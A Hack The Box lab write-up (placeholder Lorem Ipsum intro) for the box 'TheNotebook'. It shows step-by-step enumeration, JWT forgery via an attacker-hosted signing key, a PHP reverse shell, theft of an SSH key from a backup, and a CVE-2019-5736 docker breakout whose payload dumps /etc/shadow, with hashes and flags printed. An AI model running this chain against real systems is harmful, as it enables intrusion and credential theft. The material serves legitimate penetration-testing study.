---
layout: single
title: Thenotebook - Hack The Box
excerpt: "Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."
date: 2021-05-11
classes: wide
header:
  teaser: /assets/images/htb-writeup-thenotebook/thenotebook_logo.png
  teaser_home_page: true
  icon: /assets/images/htb.png
categories:
  - hackthebox
  - infosec
tags:  
  - osticket
  - mysql
  - mattermost
  - hashcat
  - rules
---

![](/assets/images/htb-writeup-thenotebook/thenotebook_logo.png)

"Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."

----------------


   ██╗   ██╗███████╗███████╗██████╗
   ██║   ██║██╔════╝██╔════╝██╔══██╗
   ██║   ██║███████╗█████╗  ██████╔╝
   ██║   ██║╚════██║██╔══╝  ██╔══██╗
   ╚██████╔╝███████║███████╗██║  ██║
    ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝


1. [root:/git/htb/thenotebook]# nmap -Pn -n -sCV --open 10.10.10.230                                                                    (master✱)
  PORT   STATE SERVICE VERSION
  22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey:
  |   2048 86:df:10:fd:27:a3:fb:d8:36:a7:ed:90:95:33:f5:bf (RSA)
  |   256 e7:81:d6:6c:df:ce:b7:30:03:91:5c:b5:13:42:06:44 (ECDSA)
  |_  256 c6:06:34:c7:fc:00:c4:62:06:c2:36:0e:ee:5e:bf:6b (ED25519)
  80/tcp open  http    nginx 1.14.0 (Ubuntu)
  |_http-server-header: nginx/1.14.0 (Ubuntu)
  |_http-title: The Notebook - Your Note Keeper
  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

DIRB:
  + http://10.10.10.230/admin (CODE:403|SIZE:9)
  + http://10.10.10.230/login (CODE:200|SIZE:1250)
  + http://10.10.10.230/logout (CODE:302|SIZE:209)
  + http://10.10.10.230/register (CODE:200|SIZE:1422)

NIKTO:
+ Server: nginx/1.14.0 (Ubuntu)


2. Looking on the website there's not much. We can register an account and post notes. Throwing the title and note field to
SQLMap shows that none of them are injectable. The register function is also not vulnerable to SQL Injection, nor sql truncation attack.

Enumerate more, maybe we can find something hidden using ffuf.

  [root:/git/htb/thenotebook]# ffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://10.10.10.230/admin/FUZZ
    notes                   [Status: 200, Size: 1713, Words: 365, Lines: 57]
    upload                  [Status: 403, Size: 9, Words: 1, Lines: 1]

Nothing of use.. Trying to access http://10.10.10.230/admin gives us 'Forbidden', this got me stuck for a while until I took a closer
look on the cookie. If we base64 decode it we get some output;

  [root:/git/htb/thenotebook]# echo "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly9sb2NhbGhvc3Q6NzA3MC9wcml2S2V5LmtleSJ9.eyJ1c2VybmFtZSI6InRlc3QxIiwiZW1haWwiOiJ0ZXN0QHRlc3QudGVzdCIsImFkbWluX2NhcCI6ZmFsc2V9.gmYjR9KgoB2_fTNK82N2BUD-BJdmlDk9R5oqStTE9qKRE-VdB43Qwx9V8SiIyMiFrjchy1_SnItICySlyNpJPi8ut4_u2g3V_YwVytg39f6gQWYVlQU3k0TRH2YTMp1eQI_Mq4BZGvd0MrI2TnJ8v75RsX_vEhff6EqhWyXrePyGU_4IhC4PEnDw1sfmWkfsTbs0-cKY8r2T1HoKkLidSBWIylVDQby387mk1bj3WdbcTZtInzyOIhZBRC_k5rDFZCTkkqIiHx5JUk_TVIDUQdw34d4GrwFHCsdpo9m0pQgXLWkdPmS7j6qJjDpr3e9OK3eojnC5cLTMKYDdnJv538nQ5v8oHlv5v743pKtUtJ8L-Pp8MbnExkIkQGhorF7LK5nFebKaAk8V1wBU71__NPMJEdtrkD5pZuY1rncamDBn1hP39opX6VBhRnHsM08ig1xR3PiBSas2SDWHDuselhuDGFJlUTxBHZ2cHFKG-msrOh4dy435N57GXSyy7iq7sqvlGjtZ_Y4A2lfFfORAYNMf-xbT3H1XZ5_i-m9nEkr0zO-eGnDgglJ-f09y9RtOc6WDULhcdNG7NE9G078nNYyhic_CG6TH7nXmG1KN2MSAIu5qBbVr4nRk8ow_Z95yYMnGNWksvx7_kd6RCXhWzdFoZa0u_Bxna-dUXWZhkD4" | base64 -d
    {"typ":"JWT","alg":"RS256","kid":"http://localhost:7070/privKey.key"}base64: invalid input

It's a JSON Web Token! The token is built from three parts, each separated by a period (.) which is why we get 'base64: invalid input'.
Lets decode the first and second part of the token to get it's content.

FIRST PART:
  [root:/git/htb/thenotebook]# echo "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly9sb2NhbGhvc3Q6NzA3MC9wcml2S2V5LmtleSJ9" | base64 -d
    {"typ":"JWT","alg":"RS256","kid":"http://localhost:7070/privKey.key"}

SECOND PART:
  [root:/git/htb/thenotebook]# echo "eyJ1c2VybmFtZSI6InRlc3QxIiwiZW1haWwiOiJ0ZXN0QHRlc3QudGVzdCIsImFkbWluX2NhcCI6ZmFsc2V9" | base64 -d (master✱)
    {"username":"test1","email":"test@test.test","admin_cap":false}

The third, and last part is the signature. Here we can create our own signature to verify the token.
Manipulate values of the first part to look on a custom key on our local host, and on the second part set admin_cap to true.

FIRST PART (Manipulated):
  [root:/git/htb/thenotebook]# echo '{"typ":"JWT","alg":"RS256","kid":"http://10.10.14.12:7070/privKey.key"}'|base64
    eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly8xMC4xMC4xNC4xMjo3MDcwL3ByaXZLZXkua2V5In0K

SECOND PART (Manipulated):
  [root:/git/htb/thenotebook]# echo '{"username":"test1","email":"test@test.test","admin_cap":true}'|base64                           (master✱)
    eyJ1c2VybmFtZSI6InRlc3QxIiwiZW1haWwiOiJ0ZXN0QHRlc3QudGVzdCIsImFkbWluX2NhcCI6dHJ1ZX0K

THIRD PART (Signature):
Create a SSH key to verify signature:
  [root:/git/htb/thenotebook]# ssh-keygen -t rsa -b 4096 -m PEM -f privKey.key                                                   (master✱)
    Generating public/private rsa key pair.
    Enter passphrase (empty for no passphrase):
    Enter same passphrase again:
    Your identification has been saved in privKey.key
    Your public key has been saved in privKey.key.pub
    The key fingerprint is:
    SHA256:PTmSuqRWcPmVBLPoUWnFaXZ/5p4m1jpTL6VeMF+K2oQ root@nidus
    The key's randomart image is:
    +---[RSA 4096]----+
    |        +=..     |
    |       ooo* .    |
    |      oo.+ o .   |
    |    ..o. oo.  . o|
    |     o..S.=   o+.|
    |      .... + . *+|
    |     .o   E o ++=|
    |    .o .   + =o=o|
    |   .. .   . ooB. |
    +----[SHA256]-----+

Write RSA key:
  [root:/git/htb/thenotebook]# openssl rsa -in privKey.key -pubout -outform PEM -out privKey.key.pub                             (master✱)
    writing RSA key

Go to https://jwt.io to create a new token.
Paste our base64 values with a period in between, and for the signature - cat privKey.key and paste the value in the 'Private Key'
text box on the right. If everything goes correctly, we should now get a new token in the 'Encoded' box to the left.

Encoded JWT Token:
eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly8xMC4xMC4xNC4xMjo3MDcwL3ByaXZLZXkua2V5In0.eyJ1c2VybmFtZSI6InRlc3QxIiwiZW1haWwiOiJ0ZXN0QHRlc3QudGVzdCIsImFkbWluX2NhcCI6dHJ1ZX0.m9QIwUJ0hHW978K2ygqK8KMXuX1wwJGvLBNAf2_JsP8C3nup8zEws9D0cq0Y0-de-4SaOr51FkjwypRmouW5njnfqMykjEKLe8T1q6q1A4_USERSKeM64KWtPmZrEAdZKiWOznycRfpMNd0V2oZX4K3yxUy_-XqrsAj0tbLUsKJXVLtKzVkaryhcKd1yVbz8au-QsapVbXRTfXkxd34aQ4_Q_fu15WJNq8_kPTCLx0qu5iBz3DQvum_2Qtx_8mgyPZP0RUGcQEwwqB49jRiyoyCNqukCbeJ4MWDxNBy5X0kRWkwKHJbRjWkseIVIeC5ghHLQ0z3dA3_R-2iTxAQhov74A7wwjbdnwrG0FqQ71oliHhYFPuewnWHiut9EzvudX-4rVqd4gtGzQyhzn3Jqqf4nVVSP6wH7cBjI93rwYkVuFxByDjAqvhMbTATAPrvx6sC-uT29OOg2yETqhZugMuo847ji6_jRgIdhstPIiRo1UwYJI7ZaskIZIBl72FFX_bIm9D5iuxpEIBpMaUuJbAncUdNwMEro1qpRzECT-1lMopxVeMBS9tOKBKM4ZQszbChXXjvyjIYN2Q3uTCcaKKkxMktg7QAN9x_huP2fZLd1mm1X6rPsRlb_JSreKsSwnCMIkrnMpKhbS71fBP7OHROXqt1NQNyc9S2WDSZGS4M


3. Open the Firefox cookie inspector (Shift + F9) and paste the new token. Start a python http.server on port 7070 and browse
http://10.10.10.230/admin.

We get a incomming GET request where the token is verified with our new key, and are allowed to access the site.
  [root:/git/htb/thenotebook]# python3 -m http.server 7070                                                                       (master✱)
    Serving HTTP on 0.0.0.0 port 7070 (http://0.0.0.0:7070/) ...
    10.10.10.230 - - [12/May/2021 09:39:07] "GET /privKey.key HTTP/1.1" 200 -

On the admin page we can upload files, so lets upload a php reverse shell. Setup a listener and trigger it.

  [root:/git/htb/thenotebook]# nc -lvnp 4488                                                                                           (master✱)
    listening on [any] 4488 ...
    connect to [10.10.14.12] from (UNKNOWN) [10.10.10.230] 41364
    Linux thenotebook 4.15.0-135-generic #139-Ubuntu SMP Mon Jan 18 17:38:24 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
     07:45:33 up 13:47,  0 users,  load average: 0.00, 0.00, 0.00
    USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    /bin/sh: 0: can't access tty; job control turned off
    $ pwd
      /
    $

Upgrade the shell.


4. With access to the backend we can now enumerate the box. There's one user in /home, noah, however we don't have access to user.txt.
With some manual enumeration we find a backup of the home directory.

  www-data@thenotebook:/var/backups$ ls -al
    -rw-r--r--  1 root root     4373 Feb 17 09:02 home.tar.gz

Extract it and download Noah's private key.

  www-data@thenotebook:/var/backups$ tar xf home.tar.gz -C /tmp/backup/

  www-data@thenotebook:/tmp/backup/home/noah/.ssh$ ls -al
    total 20
    drwx------ 2 www-data www-data 4096 Feb 17 08:59 .
    drwxr-xr-x 5 www-data www-data 4096 Feb 17 09:02 ..
    -rw-r--r-- 1 www-data www-data  398 Feb 17 08:59 authorized_keys
    -rw------- 1 www-data www-data 1679 Feb 17 08:59 id_rsa
    -rw-r--r-- 1 www-data www-data  398 Feb 17 08:59 id_rsa.pub

  www-data@thenotebook:/tmp/backup/home/noah/.ssh$ python3 -m http.server 4488
  [root:/git/htb/thenotebook]# wget 10.10.10.230:4488/id_rsa -O noah-id_rsa
  [root:/git/htb/thenotebook]# wget 10.10.10.230:4488/id_rsa.pub -O noah-id_rsa.pub
  [root:/git/htb/thenotebook]# chmod 600 noah-id_rsa
  [root:/git/htb/thenotebook]# ssh noah@thenotebook.htb -i noah-id_rsa
  noah@thenotebook:~$ id
    uid=1000(noah) gid=1000(noah) groups=1000(noah)
  noah@thenotebook:~$ cat user.txt
    9f6b2966f0a7780f90f9991264050094


██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██████╗  ██████╗  ██████╗ ████████╗
   ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝
   ██████╔╝██║   ██║██║   ██║   ██║
   ██╔══██╗██║   ██║██║   ██║   ██║
   ██║  ██║╚██████╔╝╚██████╔╝   ██║
   ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝


1. As normal, start with 'sudo -l' to see if we can grab a easy root.

  noah@thenotebook:/dev/shm$ sudo -l
    Matching Defaults entries for noah on thenotebook:
        env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

    User noah may run the following commands on thenotebook:
        (ALL) NOPASSWD: /usr/bin/docker exec -it webapp-dev01*

Access the docker and see if we can either break out with a reverse shell (sys_module abuse) or if we find anything interesting.

  noah@thenotebook:~$ sudo /usr/bin/docker exec -it webapp-dev01 bash
  root@0f4c2517af40:/opt/webapp# capsh --print
    Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+eip
    Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
    Securebits: 00/0x0/1'b0
     secure-noroot: no (unlocked)
     secure-no-suid-fixup: no (unlocked)
     secure-keep-caps: no (unlocked)
    uid=0(root)
    gid=0(root)
    groups=

Unfortunately cap_sys_module is not available, so that's a no go. We need to start looking for anything else of use.

  root@0f4c2517af40:/opt/webapp# cat create_db.py
    ..
    users = [
        User(username='admin', email='admin@thenotebook.local', uuid=admin_uuid, admin_cap=True, password="0d3ae6d144edfb313a9f0d32186d4836791cbfd5603b2d50cf0d9c948e50ce68"),
        User(username='noah', email='noah@thenotebook.local', uuid=noah_uuid, password="e759791d08f3f3dc2338ae627684e3e8a438cd8f87a400cada132415f48e01a2")

The hashes are 64 characters long and haven't been salted (no :) - looking on hashcat example hashes it is probably SHA256 hashes.
Try to crack them;

[root:/git/htb/thenotebook]# hashcat -a0 -m1400 web.hashes /usr/share/wordlists/rockyou.txt
  Session..........: hashcat
  Status...........: Exhausted
  Hash.Name........: SHA2-256
  Hash.Target......: web.hashes


2. Reading about docker privesc I came across CVE-2019-5736, where they use 'docker exec' to get root read/write.

a) Start by downloading the script and changing the payload to whatever you'd like:
  [root:/git/htb/thenotebook]# wget https://raw.githubusercontent.com/Frichetten/CVE-2019-5736-PoC/master/main.go
  root@nidus:/git/htb/thenotebook# cat main.go
    ..
    var payload = "#!/bin/bash \n cat /root/root.txt >> /tmp/thejuice && cat /etc/shadow >> /tmp/thejuice && chmod 777 /tmp/thejuice"

  [root:/git/htb/thenotebook]# go build main.go
  [root:/git/htb/thenotebook]# mv main exploit

b) Transfer the malicious file to the docker container and execute it:
  root@0f4c2517af40:/tmp# wget http://10.10.14.12/exploit
  root@4751ba9ed3da:/tmp# chmod +x exploit
  root@4751ba9ed3da:/tmp# ./exploit
    [+] Overwritten /bin/sh successfully

c) Trigger the exploit by starting a new docker session, note that we use '/bin/sh':
  noah@thenotebook:~$ sudo /usr/bin/docker exec -it webapp-dev01 /bin/sh
    No help topic for '/bin/sh'

  The exploit on the docker got triggered an terminated the service:
    [+] Overwritten /bin/sh successfully
    [+] Found the PID: 31
    [+] Successfully got the file handle
    [+] Successfully got write handle &{0xc000402060}

d) Go back to the vicitm host (thenotebook.htb) and gather your loot:

  noah@thenotebook:/tmp$ cat thejuice
    fe842e1e15cbe751b6bb98aea68425d4
    root:$6$OZ7vREXE$yXjcCfK6rhgAfN5oLisMiB8rE/uoZb7hSqTOYCUTF8lNPXgEiHi7zduz1mrTWtFnhKOCZA9XZu12osORyYnKF.:18670:0:99999:7:::
    ..
    noah:$6$fOy3f6Dp$i9.Ut7PlJpP19ZPTqmkmiRwqNunLqNEjNwq1iIeffXGi6OaDy8CtAEXXJf2SkO2fiZxuy.tWuWhsmyvl92L/W.:18670:0:99999:7:::


██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██╗███╗   ██╗███████╗ ██████╗ ██████╗ ███╗   ███╗ █████╗ ████████╗██╗ ██████╗ ███╗   ██╗
   ██║████╗  ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║
   ██║██╔██╗ ██║█████╗  ██║   ██║██████╔╝██╔████╔██║███████║   ██║   ██║██║   ██║██╔██╗ ██║
   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║╚██╔╝██║██╔══██║   ██║   ██║██║   ██║██║╚██╗██║
   ██║██║ ╚████║██║     ╚██████╔╝██║  ██║██║ ╚═╝ ██║██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║
   ╚═╝╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝

How to generate JWT RS256 key:
  https://gist.github.com/ygotthilf/baa58da5c3dd1f69fae9

JWT.IO:
  https://jwt.io/

Docker Breakout, CVE-2019-5736:
  https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout#runc-exploit-cve-2019-5736
  https://github.com/Frichetten/CVE-2019-5736-PoC
